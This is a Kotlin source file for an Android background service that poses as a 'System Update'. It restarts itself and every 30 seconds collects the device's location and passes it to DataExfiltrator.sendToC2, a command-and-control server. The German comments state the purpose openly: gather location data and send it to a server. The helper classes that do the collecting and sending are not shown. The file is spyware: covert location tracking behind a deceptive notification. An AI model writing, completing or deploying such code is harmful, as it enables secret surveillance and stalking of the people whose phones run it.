package com.example.systemserviceupdate

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import java.util.Timer
import java.util.TimerTask

class BackgroundService : Service() {
    private val tag = "BackgroundService"
    private val timer = Timer()
    private val interval: Long = 30000 // 30 Sekunden
    private val NOTIFICATION_CHANNEL_ID = "com.example.systemserviceupdate.channel"

    override fun onBind(intent: Intent): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(tag, "Hintergrunddienst gestartet")
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        startForeground(1, notification)

        timer.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                collectAndSendData()
            }
        }, 0, interval)
        
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Background Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private fun createNotification(): Notification {
        // Das Icon @mipmap/ic_launcher wird aus dem Manifest verwendet.
        // Stellen Sie sicher, dass es in Ihrem Projekt existiert.
        val notificationBuilder = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Dienst wird im Hintergrund ausgeführt")
            .setSmallIcon(R.mipmap.ic_launcher) 
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
        return notificationBuilder.build()
    }

    private fun collectAndSendData() {
        try {
            val dataCollector = DataCollector(applicationContext)
            
            // Sammle Standortdaten
            val location = dataCollector.getLocation()
            
            // Sende Daten an Server
            DataExfiltrator.sendToC2(location)
            
        } catch (e: Exception) {
            Log.e(tag, "Fehler beim Sammeln: ${e.message}")
        }
    }

    override fun onDestroy() {
        timer.cancel()
        Log.d(tag, "Dienst beendet")
        super.onDestroy()
    }
}